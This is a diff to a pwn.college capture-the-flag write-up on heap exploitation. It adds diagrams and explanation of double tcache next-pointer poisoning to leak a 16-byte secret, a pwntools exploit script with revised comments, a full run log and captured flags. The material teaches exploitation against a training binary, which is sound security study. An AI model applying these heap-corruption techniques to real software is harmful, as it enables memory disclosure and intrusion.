@@ -1906,7 +1906,7 @@ Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┆      SECRET      ┆
 ├──────────────────┤
-│   next: secret   │ 
+│    secret[:8]    │ 
 ├──────────────────┤
 │    key: NULL     │ 
 └──────────────────┘
@@ -2304,6 +2304,24 @@ pwn.college{smCm7JHRquJbXskS-KlEMuZeUe5.0lM4MDL4ITM0EzW}
 
 ## Seeking Substantial Secrets (Easy)
 
+```
+hacker@dynamic-allocator-misuse~seeking-substantial-secrets-easy:/$ /challenge/seeking-substantial-secrets-easy 
+###
+### Welcome to /challenge/seeking-substantial-secrets-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, there is a secret stored at 0x429964.
+If you can leak out this secret, you can redeem it for the flag.
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+```
+
 ### Binary Analysis
 
 ```c title="/challenge/seeking-substantial-secrets-easy :: main()" showLineNumbers
@@ -2428,6 +2446,128 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
+This time, we can see that the secret is 16 bytes long. Therefore, we will have to employ two rounds of Tcache `entry_struct` poisoning.
+
+### Polluting Tcache `entry_struct` multiple times
+
+Let's say we allocate two chunks `A`, `B` of memory and then free them. It would look something as follows:
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
+┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
+┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│    next: &B      │ ────╮
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry B  ┆
+├──────────────────┤
+│    next: NULL    │ 
+├──────────────────┤
+│    key: Void     │ 
+└──────────────────┘
+```
+
+Then we use the `scanf` command and read the the index of the first allocation `A` using the hanging pointer. The first 8 bytes at that location would hold the `next` pointer which would point to `B`. 
+
+We can overwrite this with the address of the secret.
+This would cause the chunk `B` to be removed from the singly-linked list, and the memory at the secret address would take it's place.
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
+┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
+┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│  next: &SECRET   │ ────╮
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+                         │
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
+┆  tcache_entry B  ┆     │
+├──────────────────┤     │
+│    next: NULL    │     │
+├──────────────────┤     │
+│    key: Void     │     │
+└──────────────────┘     │
+                         │
+         ╭───────────────╯         
+         │
+         v
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆      SECRET       ┆
+├───────────────────┤
+│ next: secret[:8]  │ 
+├───────────────────┤
+│ key: secret[8:16] │ 
+└───────────────────┘
+```
+
+Now, if we allocate two chunks again of the same size, the chunk `A` and `SECRET` would be allocated because to `tcache_perthread_struct`, those are the two free chunks. The first 8 bytes of the `SECRET` chunk would hold the first 8 bytes of secret value, and the next 8 bytes would be right after that.
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  tcache_perthread_struct Void                                        ┊
+┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
+┊    counts: ┃ count_16: 0    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
+┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
+┊   entries: ┃ entry_16: NULL ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
+┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+
+
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆  tcache_entry A  ┆
+├──────────────────┤
+│  next: &SECRET   │ 
+├──────────────────┤  
+│    key: NULL     │ 
+└──────────────────┘  
+
+
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┆      SECRET      ┆
+├──────────────────┤
+│    secret[:8]    │ 
+├──────────────────┤
+│       NULL       │ 
+└──────────────────┘
+```
+
+Once we malloc the chunk again, we can see that due to Tcache's behaviour of setting the `key` pointer to `NULL` clobbers the trailing 8 bytes of the secret value.
+So, using the previously employesd method, we are able to get the first 8 bytes.
+
+For the next, 8 bytes, we have to pollute Tcache `entry_struct` again, but this time we set the address into which `scanf` reads to 8 bytes after the secret values address.
+
 ### Exploit
 
 ```py
@@ -2460,6 +2600,7 @@ p.sendline(b"free")
 p.sendline(b"0")
 print(p.recvuntil(b"quit): ").decode())
 
+# Poison Index 0 to point to the first half of the secret value
 p.sendline(b"scanf")
 p.sendline(b"0")
 p.sendline(p64(secret_addr))
@@ -2484,12 +2625,12 @@ print(f"Part 1: {part1}")
 print(p.recvuntil(b"quit): ").decode())
 
 # --- LEAK PART 2 (Second 8 Bytes) ---
-# We free Index 2 (real heap) to reuse the bin. We DO NOT free Index 3.
+# We free Index 0 (real heap) to reuse the bin. We DO NOT free Index 1 (secret chunk's first half).
 p.sendline(b"free")
 p.sendline(b"0")
 print(p.recvuntil(b"quit): ").decode())
 
-# Poison Index 2 to point to the second half
+# Poison Index 0 to point to the second half of the secret value
 p.sendline(b"scanf")
 p.sendline(b"0")
 p.sendline(p64(secret_addr + 8))
@@ -2519,9 +2660,154 @@ p.sendline(full_secret)
 print(p.recvuntil(b"}").decode())
 ```
 
+```
+hacker@dynamic-allocator-misuse~seeking-substantial-secrets-easy:/$ python ~/script.py
+[*] Target Secret Address: 0x429964
+
+If you can leak out this secret, you can redeem it for the flag.
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[0] = malloc(128)
+[*] allocations[0] = 0x3c2cd2c0
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[1] = malloc(128)
+[*] allocations[1] = 0x3c2cd350
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] free(allocations[1])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3c2cd350           | KEY: 0x3c2cd010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3c2cd350          | 0                   | 0x91 (P)                     | (nil)               | 0x3c2cd010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x3c2cd350          | 0x3c2cd010          |
+| 0x3c2cd350          | 0                   | 0x91 (P)                     | (nil)               | 0x3c2cd010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] scanf("%136s", allocations[0])
+
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x429964            | 0x3c2cd000          |
+| 0x429964            | 0                   | 0 (NONE)                     | 0x65656f6c6b6a6461  | 0x7165656a7268696e  |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[0] = malloc(128)
+[*] allocations[0] = 0x3c2cd2c0
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x429964             | KEY: 0x3c2cd010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x429964            | 0                   | 0 (NONE)                     | 0x65656f6c6b6a6461  | 0x7165656a7268696e  |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Part 1: b'adjkloee'
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x65656f6c6b6a6461  | 0x3c2cd010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] scanf("%136s", allocations[0])
+
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x3c2cd2c0           | KEY: 0x3c2cd010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x3c2cd2c0          | 0                   | 0x91 (P)                     | 0x42996c            | 0x3c2cd000          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[0] = malloc(128)
+[*] allocations[0] = 0x3c2cd2c0
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[2] = malloc(128)
+[*] allocations[2] = 0x3c2cd3e0
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Part 2: b'\x00\x00\x00\x00\x00\x00\x00\x00'
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{8h25mcw-m2mhr_jLouARLydGJix.01M4MDL4ITM0EzW}
+```
+
 &nbsp;
 
 ## Seeking Substantial Secrets (Hard)
+
+```
+hacker@dynamic-allocator-misuse~seeking-substantial-secrets-hard:/$ /challenge/seeking-substantial-secrets-hard 
+###
+### Welcome to /challenge/seeking-substantial-secrets-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+```
+
+The solution is the same as the [easy one](#polluting-tcache-entry_struct-multiple-times), only difference being that we have to find the address of the secret value.
 
 ### Binary Analysis
 
@@ -2661,6 +2947,7 @@ p.sendline(b"free")
 p.sendline(b"0")
 print(p.recvuntil(b"quit): ").decode())
 
+# Poison Index 0 to point to the first half of the secret value
 p.sendline(b"scanf")
 p.sendline(b"0")
 p.sendline(p64(secret_addr))
@@ -2685,12 +2972,12 @@ print(f"Part 1: {part1}")
 print(p.recvuntil(b"quit): ").decode())
 
 # --- LEAK PART 2 (Second 8 Bytes) ---
-# We free Index 2 (real heap) to reuse the bin. We DO NOT free Index 3.
+# We free Index 0 (real heap) to reuse the bin. We DO NOT free Index 1 (secret chunk's first half).
 p.sendline(b"free")
 p.sendline(b"0")
 print(p.recvuntil(b"quit): ").decode())
 
-# Poison Index 2 to point to the second half
+# Poison Index 0 to point to the second half of the secret value
 p.sendline(b"scanf")
 p.sendline(b"0")
 p.sendline(p64(secret_addr + 8))
@@ -2721,7 +3008,7 @@ print(p.recvuntil(b"}").decode())
 ```
 
 ```
-hacker@dynamic-allocator-misuse~seeking-substantial-secrets-hard:/$ python ~/script.py
+phacker@dynamic-allocator-misuse~seeking-substantial-secrets-hard:/$ python ~/script.py
 ###
 ### Welcome to /challenge/seeking-substantial-secrets-hard!
 ###
